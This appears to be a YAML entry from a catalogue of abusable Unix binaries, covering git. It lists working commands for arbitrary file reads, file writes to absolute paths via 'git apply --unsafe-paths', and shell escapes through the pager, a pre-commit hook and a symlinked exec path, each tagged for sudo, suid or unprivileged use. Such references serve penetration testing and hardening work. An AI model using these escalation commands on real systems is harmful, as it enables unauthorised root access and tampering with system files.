---
functions:
  file-read:
  - code: |-
      git diff /dev/null /path/to/input-file
    comment: |-
      The read file content is displayed in `diff` style output format.
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - code: |-
      git apply --unsafe-paths --directory / x.patch
    comment: |-
      The patch can be created locally by creating the file that will be written on the target using its absolute path:

      ```
      echo DATA >/path/to/input-file
      git diff /dev/null /path/to/input-file >x.patch
      ```
    contexts:
      sudo:
      suid:
      unprivileged:
  inherit:
  - code: |-
      git help config
    contexts:
      sudo:
      unprivileged:
    from: less
  - code: |-
      git branch --help config
      !/bin/sh
    comment: |-
      The help system can also be reached from any `git` command, e.g., `git branch`.
    contexts:
      sudo:
      unprivileged:
    from: less
  shell:
  - code: |-
      PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
    contexts:
      sudo:
      unprivileged:
  - code: |-
      git init .
      echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit
      chmod +x .git/hooks/pre-commit
      git -C . commit --allow-empty -m x
    comment: |-
      Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used, and moving into the directory works too.
    contexts:
      sudo:
      unprivileged:
  - code: |-
      ln -s /bin/sh git-x
      git --exec-path=. x
    contexts:
      sudo:
      suid:
        code: |-
          ln -s /bin/sh git-x
          git --exec-path=. x -p
        shell: false
      unprivileged:
...
